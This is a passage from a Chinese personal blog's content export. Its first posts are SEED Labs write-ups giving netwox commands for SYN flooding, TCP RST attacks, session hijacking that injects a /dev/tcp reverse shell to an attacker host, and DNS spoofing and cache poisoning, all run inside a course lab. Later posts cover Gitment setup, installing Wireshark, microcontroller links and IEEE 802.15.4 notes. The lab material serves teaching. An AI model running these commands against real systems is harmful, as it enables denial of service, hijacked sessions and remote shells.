net.ipv4.tcp_max_syn_backlog 我们可以使用命令“netstat -na”来检查队列的使用情况，即与监听端口关联的半开连接的数量。这种连接的状态是SYN-RECV。如果三次握手完成，连接的状态将建立。 Netwox编号为76的工具提供了SYN 洪泛攻击的基本功能，输入“netwox 76 –help”可以获取如下帮助信息。 首先在用户机上使用telnet 192.168.0.10命令测试telnet连接是否可用，验证可以成功登陆后即退出，然后攻击者开始使用如下命令发起攻击： 1$ sudo netwox 76 --dst-ip 192.168.0.10 --dst-port 23 然后，用户机再次通过telnet连接到服务器，此时发现依然可以连接，按照实验指导手册所说，我们需要检查机器是否已经开启SYN cookie机制，SYN cookie是抵御SYN洪泛攻击的防御机制。我们可以使用sysctl命令查看、打开和关闭SYN cookie机制，使用如下命令查看SYN cookie机制的设置情况： 1$ sysctl -a | grep cookie 可以看到默认情况下， SYN cookie机制是启用的，所以先将其关闭后再尝试攻击，使用如下命令将其关闭： 1$ sysctl -w net.ipv4.tcp_syncookies=0 此时，再次发起攻击，并尝试再次使用telnet连接到服务器，发现已经无法连接到服务器了，如下： 当然，你也可以通过wireshark抓包来查看攻击者发送的数据包。实验完成后，再使用如下命令将SYN cookie机制打开，以防止SYN洪泛攻击。 1$ sysctl -w net.ipv4.tcp_syncookies=1 TCP RST攻击telnet和ssh连接 RST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。发送RST包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。TCP RST攻击可以终止两个受害者之间建立的TCP连接。例如，如果两个用户A和B之间建立了Telnet连接（TCP），则攻击者可以将A到B的RST数据包进行欺骗，从而破坏现有的连接。为了在这次攻击中取得成功，攻击者需要正确构造TCP RST数据包。Netwox编号为78的工具提供了RST攻击的基本功能，输入“netwox 78 –help”可以获取如下帮助信息。 在用户机上使用telnet命令连接到服务器，登录成功以后，攻击者发起RST攻击，通过netwox 78号工具伪造RST包发送给服务器，命令如下： 1netwox 78 –i 1921.68.0.10 命令运行后悔使得用户机与服务器的telnet连接中断，攻击效果如下图： 在用户机上使用ssh命令连接到服务器，登录成功以后，攻击者发起RST攻击，通过netwox 78号工具伪造RST包发送给服务器，使得用户机与服务器的SSH连接中断，实验效果如下图： TCP RST攻击视频流应用程序 实验原理与任务2相同。TCP RST攻击终会止两个受害者之间建立的TCP连接。在用户机上使用浏览器访问优酷的视频，攻击者向用户发起RST攻击，再刷新浏览器页面时即显示，为了在这次攻击中取得成功，攻击者需要正确构造TCP RST数据包。 Netwox编号为78的工具提供了RST攻击的基本功能攻击命令，通过netwox 78号工具伪造RST包发送给服务器，命令如下： 1netwox 78 –i 1921.68.0.100 攻击效果如下图，正常观看视频，发起攻击再刷新页面后TCP连接断开，页面崩溃。 TCP会话劫持 开启wireshark，并设置过滤器–filter telnet，然后开始监控局域网内的流量。用户开始使用telnet连接到服务器，分析telnet连接建立时发送的数据包，然后根据其特征伪造相应的数据包来劫持会话。 Netwox编号为40的工具提供了SYN 洪泛攻击的基本功能，输入“netwox 40 –help”可以获取如下帮助信息。 使用netwox的40号工具，根据抓包数据的TCP源端口目的端口填写tcp-src和tcp-dst，根据IP包的源地址目的地址填写ip4-src和ip4-dst，根据用户机发送给服务器的最后一个数据包的Next sequence nuber字段填写tcp-seqnum，根据服务器发送给用户机的最后一个数据包的Acknowledgement number字段填写tcp-acknum，根据IP包的TTL字段填写ip4-ttl，根据IP包的协议字段填写ip4-protocol ，然后根据需要填写tcp-data字段。加入我们发送ls命令到服务器来查看该目录下有什么文件，将ls转换成16进制并加上\r的16进制数，生成我们的命令如下： 1sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 59714 --tcp-dst 23 --tcp-seqnum 3089814629 --tcp-acknum 1471714290 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data &quot;6c730d00&quot; 通过wireshark抓包可以看到命令已经发出，效果如下： 紧接着，服务器会将该命令的执行结果发送出来，我们同样可以通过抓包查看，如下所示，可以看到ls命令的执行结果，即显示该目录下所有文件： 使用TCP会话劫持创建反向Shell 设置后门的一个典型方法是从受害者机器运行一个反向外壳，以使外壳访问受害者机器。反向shell是在远程机器上运行的一个shell进程，连接到攻击者的机器。攻击者一旦遇到危险，就可以方便地访问远程机器。 netcat程序允许我们指定一个端口号，并可以监听该端口上的连接。我们可以在攻击者机器上，使用如下命令netcat监听端口9090上的连接： 1nc –l 9090 -v “/bin/bash -i&gt; /dev/tcp/10.0.2.4/9090 0 &lt;＆1 2&gt;＆1”会启动一个bash shell，其输入来自tcp连接，其标准错误输出将被重定向到相同的tcp连接。将该命令转换成16进制，并在最后添加回车的16进制代码，即0x0d00。 然后通过上面3.4的会话劫持将这个命令发送到服务器，命令如下： 1sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 53700 --tcp-dst 23 --tcp-seqnum 3862965514 --tcp-acknum 3719047389 --tcp-window 128 --tcp-urgptr 0 --tcp-data &quot;2F62696E2F62617368202D69203E202F6465762F7463702F3139322E3136382E302E3230302F3930393020303C263120323E26310d00&quot; 通过wireshark抓包可以看到数据包已经构造成功，并且发送到服务器。 由于攻击者一直在监听9090端口，服务器一旦接收到这个命令就会向攻击者建立连接，从而拿到服务器的shell，如下图所示netstat的输出显示已建立的连接。]]></content>
      <categories>
        <category>Network security</category>
      </categories>
      <tags>
        <tag>Seed Labs</tag>
        <tag>TCP/IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seed Labs: Local DNS Attack Lab]]></title>
    <url>%2F2018%2F01%2F11%2FSeed-Labs-Local-DNS-Attack-Lab%2F</url>
    <content type="text"><![CDATA[网络与计算机安全课程的实验，使用的是美国雪城大学的开放实验平台：Seed Project。 实验原理与目的 DNS（域名系统）是因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便地访问互联网，而不用去记住能够被机器直接读取的IP数串。本次实验涉及三种DNS攻击类型，分别是（1）修改用户机器中的hosts文件，从而实现DNS攻击（2）DNS欺骗，攻击者冒充域名服务器向发送DNS查询的机器发送欺骗DNS响应。（3）缓存污染，利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。实验目的是了解上述3种DNS攻击的原理，以及DNS攻击是如何实现的，然后学会防范这样的攻击。 实验配置 按照实验指导手册，从SeedProject的网站上下载Ubuntu12.04的镜像，它已经帮我们装好了实验必须的环境以及一些需要用到的软件。该系统默认的用户名是seed，密码是dees。 实验资料下载地址： http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Local/ 然后，配置3台虚拟机，1台作为DNS服务器，1台作为用户机，另1台作为攻击者，3台机器通过设置NAT网络来实现网络互访。一般情况下，可直接复制虚拟机镜像生成三台虚拟机，不过有可能会出错。另外，3台虚拟机同时打开需要较大的内存，主机内存4G的会很卡，8G的完全没问题。实验示意图如下： Vmware配置 SeedProject提供的是VirtualBox，但是在这里不建议使用，开源的还是会遇到一些莫名其妙的问题，浪费很多时间在虚拟机环境的配置上不划算。我们应该聚焦实验，所以选择更方便更简单的VMware。 点击菜单栏-》编辑-》编辑虚拟网络，将下面的子网IP修改成192.168.0.0，子网掩码设置成255.255.255.0，找到VMnet8 NAT，编辑它，将网关修改成192.168.0.2，保存即可。 为方便操作经常需要在虚拟机和主机之间复制内容，所以需要安装Wmvare Tools。点击顶部菜单栏的虚拟机，选择重新安装VMware Tools，将打开的VMware文件复制到桌面上并解压，然后打开终端，使用命令进行安装： 12$ cd /home/你的用户名/Desktop/VMwareTools版本号.../$ ./vmware-install.pl 然后一步步安装说明进行操作即可，安装完成后可能需要重启虚拟机。 DNS服务器配置 IP和DNS基本配置： IP地址：192.168.0.10 子网掩码：255.255.255.0 网关：192.168.0.2 DNS服务器：114.114.114.114 （1）在DNS服务器上安装BIND9，BIND是一个开源的DNS服务器程序。 12$ sudo apt-get update$ sudo apt-get install bind9 （2）创建named.conf.options文件。DNS服务器需要读取/etc/bind/named.conf配置文件才能启动。这个配置文件通常包含一个叫/etc/bind/named.conf.options的选项文件，我们添加以下内容用于后续的DNS缓存污染实验： 123options &#123;dump-file &quot;/var/cache/bind/dump.db&quot;;&#125;; 文件/var/cache/bind/dump.db用于转储DNS服务器的缓存。假定我们在服务器中拥有一个域名： example.com，因此我们需要配置关于该域名的一些信息。为避免输入所带来的错误，它建议我们从SeedProject网站下载相应的文件放置到/etc/bind/目录下。 Zone file for domain example.com: /var/cache/bind/example.com.db Zone file for DNS reverse lookup: /var/cache/bind/192.168.0 （3）启动DNS服务器。 上述步骤完成后，我们的DNS服务器基本就配置完成了，然后我们使用如下命令将其启动： 123$ sudo /etc/init.d/bind9 restartor$ sudo service bind9 restart 用户机配置 IP和DNS基本配置： IP地址：192.168.0.100 子网掩码：255.255.255.0 网关：192.168.0.2 DNS服务器：192.168.0.10 攻击者配置 IP和DNS基本配置： IP地址：192.168.0.200 子网掩码：255.255.255.0 网关：192.168.0.2 DNS服务器：114.114.114.114 实验过程修改host文件的攻击 该攻击实验假定我们已经获取了受害者机器的账号密码，因此，我们在攻击者机器上通过ssh连接到用户机器，然后修改其/etc/hosts文件，添加如下一行： 11.2.3.4 www.example.com 然后使用ping 得到如下图的结果，可以看到该域名对应的IP地址已经变更为1.2.3.4。因为如果用户机器中的hosts文件中存在该域名的条目，那么将直接解析该域名为条目中对应的IP地址，而不询问任何DNS服务器。攻击完成后，用户再使用ping时即可看到www。Example的地址已经变成1.2.3.4，如下图： 注意，这里使用nslookup进行查看时是不能看到攻击效果的，因为nslookup不会先查本地的hosts文件，而是直接向DNS服务器发送一个DNS查询请求。 欺骗DNS响应 当用户在Web浏览器中输入网站域名时，用户计算机将向DNS服务器发出DNS请求以解析IP地址的主机名称。位于同一局域网的攻击者可以监听到这个DNS请求，然后在DNS服务器返回DNS响应之前伪造一个虚假的DNS响应发送给DNS请求者。当然，DNS响应需要满足以下要求才会被DNS请求者接受： 源IP地址必须与DNS服务器的IP地址相匹配。 目标IP地址必须与用户机器的IP地址相匹配。 源端口号（UDP端口）必须与DNS请求发送到的端口号（通常为端口53）相匹配。 目标端口号必须与发送DNS请求的端口号相匹配。 UDP校验和必须正确计算。 交易ID必须与DNS请求中的交易ID匹配。 响应的问题部分中的域名必须与请求的问题部分中的域名相匹配。 响应部分中的域名必须与DNS请求的问题部分中的域名匹配。 用户的计算机必须收到攻击者的DNS答复，才能收到合法的DNS响应。 Netwox工具105提供了一个实用程序来进行这样的嗅探和响应。攻击者使用Netwox工具来监听来自用户机的数据包，并生成一个虚假的DNS响应包给DNS请求者，即用户机。实验原理示意图如下： Netwox命令如下： 1sudo netwox 105 --hostname &quot;www.example.com&quot; --hostnameip 192.168.0.200 --authns &quot;ns.example.com&quot; --authnsip 192.168.0.200 --filter &quot;src host 192.168.0.100&quot; 配置好以后开始监听，同时，打开wireshark以便后续分析攻击结果，当监听到DNS请求时，可以在窗口看到生成的DNS响应信息，如下图： 同时，在客户机也可以看到查到的地址已经变成了攻击者的IP地址，证明攻击成功。如下图： 查看wireshark的抓包信息，可以看到我们通过生成的欺骗DNS响应的内容如下，完全符合要求，所以会被DNS请求者接收，从而实现DNS欺骗。 DNS服务器缓存污染 上面的DNS欺骗攻击在每次用户的机器发出www.example.com的DNS查询，攻击者的机器都必须发出一个欺骗性的DNS响应，这样效率很低，为了达到持久的效果，我们可以进行针对DNS服务器进行攻击。 当一个DNS服务器接收到一个查询时，如果它可以解析则直接解析并响应，当主机名不在它的域中，它将要求其他的DNS服务器去解析主机名。当其他的DNS服务器将解析结果返回给该服务器后，它将把解析结果存储在缓存中，所以下一次不需要询问其他的DNS服务器。如果攻击者可以伪造来自其他DNS服务器的响应，那么该DNS服务器会接手伪造的DNS响应，并在一定时间内将欺骗响应保留在其缓存中。下一次，当用户的机器想要解析相同的主机名时，该DNS服务器会使用缓存中的欺骗性响应来回复。这样，攻击者只需要欺骗一次，并且影响将持续到缓存的信息到期。攻击示意图如下： 为避免我们要攻击的DNS服务器已经有缓存，攻击之前，我们要确保DNS服务器的缓存为空，可以使用以下命令刷新缓存： 1$ sudo rndc flush 攻击者使用Netwox工具来监听来自DNS服务器机的数据包，然后生成一个假的DNS响应给我们的DNS服务器。Netwox的命令如下： 1sudo netwox 105 --hostname &quot;www.fanzhenyu.me&quot; --hostnameip 192.168.0.200 --authns &quot;ns.fanzhenyu.me&quot; --authnsip 192.168.0.200 --ttl 600 --filter &quot;src host 192.168.0.10&quot; --spoofip &quot;raw&quot; 然后，在用户机使用如下命令发起DNS查询请求： 1$ nslookup www.fanzhenyu.me 攻击结果如下图，与没有攻击对比，缓存污染后DNS请求的响应已经是被污染的IP地址： 同时，可以使用如下命令转储和查看DNS服务器的缓存， 12$ sudo rndc dumpdb -cache $ sudo cat /var/cache/bind/dump.db 结果如下图，可以看到缓存已被污染。]]></content>
      <categories>
        <category>Network security</category>
      </categories>
      <tags>
        <tag>Seed Labs</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-预见不一样的自己]]></title>
    <url>%2F2018%2F01%2F01%2F2018-%E9%A2%84%E8%A7%81%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E8%87%AA%E5%B7%B1%2F</url>
    <content type="text"><![CDATA[告别2017最艰难的一周，迎接2018年新的起点。 2017，遇见不一样的自己 上半年，本科毕业，告别了四年里一起学习、一起玩耍、一起开心、一起难过的同学，指引我努力向上的恩师们，也告别了一起奋斗的实验室小伙伴们。面对现实，再多不舍也会被冲淡，只是我们依然铭记。 于是，在2017的最后一天，和本科的老铁一起去了期待四年的省博物馆，然后开车回农大，在校园里逛，在新润一边吃烧烤，一边和同学、助班视频，曾经的记忆扑面而来。或许，这就是情谊，是生活吧。 下半年，研究生生活开端，来到更大的平台，接触更多不一样的人，了解越来越多的事情，学习很多新的技能，也尝试了很多一直不敢想的事。于是，也便有了对未来的美好期盼，虽然依然无法看到未来的样子，但是也还一直在为着这些所谓的美好期盼努力着。 也因此，面临更大的挫折，有了更多的压力，更多的迷茫，更多的不知所措。但是，我相信未来还是美好的。正所谓，心之所向，素履以往。不忘初心，方能始终。 2018，预见不一样的自己 2017，改变不少，但依然少了一份敢闯敢拼的劲头。2018，做不一样的自己。 记得有这么一段话， 你要记住大雨中为你撑伞的人 帮你挡住外来之物的人 黑暗中默默抱紧你的人 逗你笑的人 陪你彻夜聊天的人 坐车来看望你的人 陪你哭过的人 在医院陪你的人 总是以你为重的人 是这些人组成你生命中一点一滴的温暖 是这些温暖使你远离阴霾 是这些温暖使你成为善良的人 2017， 谢谢你们，一直都在。 2018， 愿每一个爱我的人和我爱的人，都能被岁月温柔以待。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（五）]]></title>
    <url>%2F2017%2F12%2F03%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Gitment是一款基于GitHub Issues的评论系统。这篇博客介绍Hexo如何集成Gitment评论系统。 为了博客能够支持评论，试过很多评论系统，多说挂了，网易云跟帖也挂了，最后换到来必力，但是发现评论经常显示不出来，登录评论后台还得翻墙，于是找到了现在的Gtiment。 对于hexo+Github搭建的博客，使用Gitment应该是最好的选择了，因为他是基于Github的Issue来做的，每篇文章的评论会创建一个Issue。 尽管还有类似的开源项目，比如Gittalk也可以实现同样的功能，由于我使用的是next主题，所以Gitment的默认样式可能更适合我的博客，虽然样式是可以自定义的，但是对于我这种不回前端的人来说怎么简单怎么来吧。 注册OAuth Application 在Github点击右上角个人头像的下拉图标，选择Setting，然后在打开的页面左边点击 Developer settings，最后点击New OAuth app。然后填写相关的信息： Application name —— 应用名，随便填写 Homepage URL —— 你的博客地址 Application description —— 应用的描述，随便填写 Authorization callback URL —— 你的博客地址 填写信息完毕后点 Register application 就可以看到刚刚注册好的OAuth Application的信息，其中 Client ID 和 Client Secret 在后面要用到。 配置Hexo和next 修改Next主题的评论框架布局文件themes\next\layout\_partials\comments.swig，打开该文件后可以看到关于多说、友言、Disqus等评论系统已经被添加到评论区布局框架上，所以我们只要在最后添加一个关于Gitment的分支即可，如下： 1234567&#123;% elseif theme.gitment.enable %&#125; &#123;% if theme.gitment.lazy %&#125; &lt;div onclick=&quot;showGitment()&quot; id=&quot;gitment-display-button&quot;&gt;&#123;&#123; __(&apos;gitmentbutton&apos;) &#125;&#125;&lt;/div&gt; &lt;div id=&quot;gitment-container&quot; style=&quot;display:none&quot;&gt;&lt;/div&gt; &#123;% else %&#125; &lt;div id=&quot;gitment-container&quot;&gt;&lt;/div&gt; &#123;% endif %&#125; Gitment评论系统的调用接口已经做好，但是还没有具体实现，所以接着我们在themes\next\layout\_third-party\comments增加一个文件gitment.swig，并在里面添加具体实现： 12345678910111213141516171819202122232425262728293031323334353637&#123;% if theme.gitment.enable %&#125; &#123;% set owner = theme.gitment.owner %&#125; &#123;% set repo = theme.gitment.repo %&#125; &#123;% set cid = theme.gitment.client_id %&#125; &#123;% set cs = theme.gitment.client_secret %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://imsun.github.io/gitment/style/default.css&quot;&gt; &lt;script src=&quot;https://imsun.github.io/gitment/dist/gitment.browser.js&quot;&gt;&lt;/script&gt; &#123;% if theme.gitment.lazy %&#125; &lt;script type=&quot;text/javascript&quot;&gt; function showGitment()&#123; document.getElementById(&quot;gitment-display-button&quot;).style.display = &quot;none&quot;; document.getElementById(&quot;gitment-container&quot;).style.display = &quot;block&quot;; var gitment = new Gitment(&#123; id: window.location.pathname, owner: &apos;&#123;&#123;owner&#125;&#125;&apos;, repo: &apos;&#123;&#123;repo&#125;&#125;&apos;, oauth: &#123; client_id: &apos;&#123;&#123;cid&#125;&#125;&apos;, client_secret: &apos;&#123;&#123;cs&#125;&#125;&apos;, &#125;&#125;); gitment.render(&apos;gitment-container&apos;); &#125; &lt;/script&gt; &#123;% else %&#125; &lt;script type=&quot;text/javascript&quot;&gt; var gitment = new Gitment(&#123; id: window.location.pathname, owner: &apos;&#123;&#123;owner&#125;&#125;&apos;, repo: &apos;&#123;&#123;repo&#125;&#125;&apos;, oauth: &#123; client_id: &apos;&#123;&#123;cid&#125;&#125;&apos;, client_secret: &apos;&#123;&#123;cs&#125;&#125;&apos;, &#125;&#125;); gitment.render(&apos;gitment-container&apos;); &lt;/script&gt; &#123;% endif %&#125;&#123;% endif %&#125; 然后在themes\next\layout\_third-party\comments\index.swig添加一行： 1&#123;% include &apos;gitment.swig&apos; %&#125; 最后，在NexT主题配置文件中配置一下Gitment，在themes\next\_config.yml中添加以下内容： 12345678# Gitmentgitment: enable: true # gitment评论系统开关 lazy: true # 评论懒加载开关 owner: fzy-Line # GitHub用户名 repo: fzyLine.github.io # 存储评论数据的GitHub仓库的仓库名 client_id: # 复制注册OAuth Application后得到的Client ID client_secret: # 复制注册OAuth Application后得到的Client Secret 常见错误Error: Not Found 出现这样错误的原因主要是： repo指定的仓库名对应的仓库在GitHub上根本不存在，应该修改为正确的仓库名，最好就是用自己博客所使用那个仓库，这样的话所有的评论创建的Issue就是博客仓库的Issue。 repo指定的值是其仓库地址，而不是仓库名，应该修改为仓库名。 Error: Comments Not Initialized 出现这样错误的原因主要是： － 在注册OAuth Application时，Authorization callback URL填写的地址错误－ 还没有在该页面的Gitment评论区登陆GitHub账号，需点击login登录github，然后点击初始化按钮进行初始化。 Issues重复初始化 这个问题在Gitment的Github项目Issue中也有很多人提到，貌似还是个BUG，没有得到解决。所以，只有自己多多注意啦。 不要在初始化一篇文章后再去点浏览器的返回按钮然后再回到原来的这篇文章，这样的话，虽然创建了一个Issue，但是初始化按钮还是会存在，如果你再去点就会出现两个Issue。 总结 当然，Gitment也有它的不足，目前它只能用Github账号登录来评论。但是，对于技术博客，特别是IT技术博客，这样也足够了，看你博客的人基本也是这个行业的，而Github又那么有名，所以基本大家都有账号。 由于每一篇文章都要初始化，对于之前写了很多博客的人来说，之前这些文章的初始化确实是个问题，比如写了100多篇的我，乖乖的手动为每一篇点了一下初始化。当然，也有人做了自动化初始化的脚本，大家可以试试。 自动初始化 Gitalk 和 Gitment 评论：https://draveness.me/git-comments-initialize 更详细的介绍可以在我参考的这篇博客中找到答案： 添加Gitment评论系统到Hexo主题NexT：https://extremegtr.github.io/2017/09/07/Add-Gitment-comment-system-to-hexo-theme-NexT/]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04 LTS中安装wireshark]]></title>
    <url>%2F2017%2F12%2F02%2FUbuntu16-04-LTS%E4%B8%AD%E5%AE%89%E8%A3%85wireshark%2F</url>
    <content type="text"><![CDATA[经常分析不同的网络协议和研究数据包的人一定经常使用 Wireshark。 虽然Linux也有像tcpdump这样的工具来实现抓包，但是与难以操作的命令行网络协议分析工具不同的是，Wireshark 拥有非常简洁易用的图形界面，使用 Wireshark 可以很容易地查看有线和无线网络的实时信息。 安装打开一个终端： 1$ sudo apt-get install wireshark 运行与配置 安装完成后使用非root直接运行wireshark的话，由于权限不足，所以无法识别网卡，只能打开pcap的文件，所以我们需要使用sudo提升权限。 默认情况下，访问网络端口需要root权限，而wireshark的只是/usr/share/dumpcap的一个UI，/usr/share/dumpcap需要root权限，所以没法non-root用户无法读取网卡列表。 root运行打开一个终端： 1$ sudo wireshark 但是，这样如果使用root运行则可能会报错： 要对init.lua进行修改，终端运行： 1$ sudo gedit /usr/share/wireshark/init.lua 将倒数第二行改为： 1--dofile(DATA_DIR..&quot;console.lua&quot;) 再启动软件就OK啦。 1$ sudo wireshark 非root运行虽然可以使用root成功运行wireshark，但是wireshark官方不推荐这么做： 12Running as user &quot;root&quot; and group &quot;root&quot;.This could be dangerous. 另外，这样做也不是很方便，特别是在使用桌面版时，如果要通过放置在侧边栏的图标打开wireshark时，默认是不会使用root用户打开的，所以我们需要设置wireshark为非root用户也能执行。 添加wireshark用户组 1$ sudo groupadd wireshark 将dumpcap更改为wireshark用户组 1$ sudo chgrp wireshark /usr/bin/dumpcap 让wireshark用户组有root权限使用dumpcap 1$ sudo chmod 4755 /usr/bin/dumpcap 将需要使用的普通用户名加入wireshark用户组，例如我的用户是“fzy”，则需要使用命令： 1$ sudo gpasswd -a fzy wireshark]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[51单片机学习系列博客整理]]></title>
    <url>%2F2017%2F11%2F26%2F51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[整理2015年写的一些单片机相关的博客。 2015年我开始在CSDN写博客，当时自己在学院的电子设计创新实验室，主要学习单片机和嵌入式开发。同时，我们也在为电子协会讲课，51单片机是嵌入式入门的基础，也是电子协会讲课的内容。 那段时间，我不仅整理知识点做PPT，还把内容分享到CSDN博客。时至今日，这些博客依然还有人在评论，也有人私信我，可以说这是我没有想到的。在这里整理一下这些博客文章： 51单片机矩阵键盘扫描：http://blog.csdn.net/u013151320/article/details/46621645 51单片机数码管详解：http://blog.csdn.net/u013151320/article/details/49885679 51单片机中断详解（上）：http://blog.csdn.net/u013151320/article/details/49977813 51单片机中断详解（中）：http://blog.csdn.net/u013151320/article/details/50034627 51单片机中断详解（下）：http://blog.csdn.net/u013151320/article/details/50120063 51单片机串口通信：http://blog.csdn.net/u013151320/article/details/50125257 51单片机DS1302实时时钟驱动程序：http://blog.csdn.net/u013151320/article/details/50221091 51单片机I2C总线驱动程序：http://blog.csdn.net/u013151320/article/details/50265967 51单片机LCD1602程序详解：http://blog.csdn.net/u013151320/article/details/46663167 51单片机AD转换之PCF8591：http://blog.csdn.net/u013151320/article/details/50310231 51单片机DHT11温湿度传感器：http://blog.csdn.net/u013151320/article/details/50389624 51单片机基本的编程就是这些，当时也只写了这些，加入了一些自己的理解，分享出来希望对大家有帮助。 现在虽然我已经不再做这个，但是我认为51单片机是我现在学习的一个基础，有了这个基础，你再接触更复杂的嵌入式开发板都能够搞定，原理都是一样的，学会看原理图、芯片手册等资料就能玩得动。 当然，也可以利用单片机来做一些实际的开发。比如，当时随着串口Wi-Fi模块的推出，以及物联网云平台的兴起，我们做了一些网络通信的小项目，将单片机通过传感器采集的数据传输到云端进行存储，然后再通过手机去获取并展示数据，同时也可以实现远程控制。 在现在看来，这些都是已经是十分成熟的技术路线了。所以，学习完51单片机的基础知识，建议学习一下STM32等稍微高端的一点的单片机，结合网络协议、云端技术以及物联网操作系统去做一些小项目来进行练习。]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>［单片机,整理］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IEEE 802.15.4标准学习笔记（一）]]></title>
    <url>%2F2017%2F11%2F25%2FIEEE-802-15-4%E6%A0%87%E5%87%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[IEEE 802.15.4是定义低速率无线个域网（LR-WPAN）操作的技术标准。它规定了LR-WPAN的物理层和媒体访问控制，由IEEE 802.15工作组维护。 IEEE 802.15.4标准简介 LR-WPAN（低速无线个域网）是一种简单，低成本的通信网络，可在具有有限功率和松散吞吐量要求的应用中实现无线连接。LR-WPAN的主要目标是易于安装，可靠的数据传输，极低的成本和合理的电池寿命，同时保持简单灵活的协议。 IEEE 802.15.4标准工作组致力于在固定、便携及移动的廉价设备之间实现低复杂度、低成本且功耗极低的无线连接，其把应用领域重点放在无线传感器网络上。 它是ZigBee、ISA100.11a、WirelessHART和Thread等规范的基础，每个规范都通过开发IEEE 802.15.4中未定义的上层来进一步扩展标准。或者，它可以与6LoWPAN一起使用来定义上层。 IEEE 802.15.4标准的主要特征： 支持星型和点到点两种拓扑结构； 在网络中采取两种地址方式：16位地址和64位地址。其中16位地址是有协调器分配的，64位地址是全球唯一的扩展地址； 采用可选的时槽保障（Guaranteed Time Slots，GTS）机制； 采用带冲突避免的载波侦听多路访问（Carrier sense multiple access with collision avoidance，CSMA-CA）的信道访问机制; 支持ACK机制以保证可靠传输； 低功耗机制； 信道能量检测（Energy Detection，ED）； 链路质量指示（Link quality indication，LQI）； 网络组成 IEEE 802.15.4网络由一个PAN协调器和至少一个网络设备组成。每个网络包含一个专用中央网络协调器，称为PAN协调器。只有PAN协调器可以建立新网络，并且定义网络的结构和运行模式。其他设备通过加入到向PAN协调器申请加入到网络中来。除了PAN协调器外，IEEE 802.15.4标准还定义了两种设备：协调器与网络设备。协调器为网络中其他设备提供协调服务。 两种不同的设备类型可以参与IEEE 802.15.4网络：全功能设备（FFD）和精简功能设备（RFD）。FFD包含全部MAC服务，可以实现全部三种功能：PAN协调器、协调器和网络设备，RFD包含精简的MAC服务，只能用作网络设备。 FFD是能够用作个人区域网络（PAN）协调器或协调器的设备，而RFD则不能。RFD适用于非常简单的应用，它不需要发送大量的数据，并且一次只能与单个FFD相关联。因此，RFD可以使用最少的资源和存储容量来实现。 网络拓扑结构 根据应用要求，IEEE 802.15.4 LR-WPAN以两种拓扑结构中的任一种运行：星形拓扑或对等拓扑。在星形拓扑中，通信建立在设备和单个中央控制器之间，称为PAN协调器。设备通常具有一些相关联的应用，并且是网络通信的起始点或终止点。PAN协调器还可以具有特定的应用，但它可以用于启动，终止或路由网络周围的通信。 PAN协调器是PAN的主要控制器。 在任一拓扑网络上运行的所有设备都有唯一的地址，称为扩展地址。设备将使用扩展地址进行PAN内的直接通信或PAN协调器在设备关联时分配的短地址。PAN协调器通常由主电源供电，而这些设备最有可能由电池供电。 对等拓扑也具有PAN协调器；然而，它与星形拓扑不同之处在于，只要它们在彼此的范围内，任何设备都能够与任何其他设备通信。对等拓扑允许实现更复杂的网络结构，例如网状网络拓扑。对等网络允许多跳将消息从任何设备路由到网络上的任何其他设备。这些功能可以在较高层添加，但不属于此标准。 每个独立的PAN选择唯一的标识符。该PAN标识符允许使用短地址在网络内的设备之间进行通信，并实现跨独立网络的设备之间的传输。选择标识符的机制不属于本标准的范围。 星形拓扑 星形网络的基本结构如上图所示。在星形网络拓扑结构中，通信由一个PAN协调器控制，这个PAN协调器作为网络的主控设备，发送实现设备同步的信标帧（包括超帧控制），并且维护关联的管理。 （1）网络建立流程 任何FFD在被激活之后，它可以建立自己的网络并成为PAN协调器。所有星形网络独立于当前正在运行的所有其他星形网络。在一个新的星形网络形成的过程中，PAN协调器必须选择一个网络标识符（PAN ID），这个PAN ID不应该被网络周围的任何相邻网络所占用。PAN协调器周期性地扫描所有可用的或者可选择的信道，寻找已经建立的网络，然后选择一个和他们都不同的PAN ID。之后，PAN协调器才开始周期性地发送信标，允许其他设备（可能是FFD和RFD）加入其网络。 （2）特点 所有设备都与中心设备PAN网络协调器通讯 网络协调器持续供电，其他设备电池供电 适合家庭自动化、个人计算机外围设备、个人康护护理等小范围的室内应用 对等拓扑 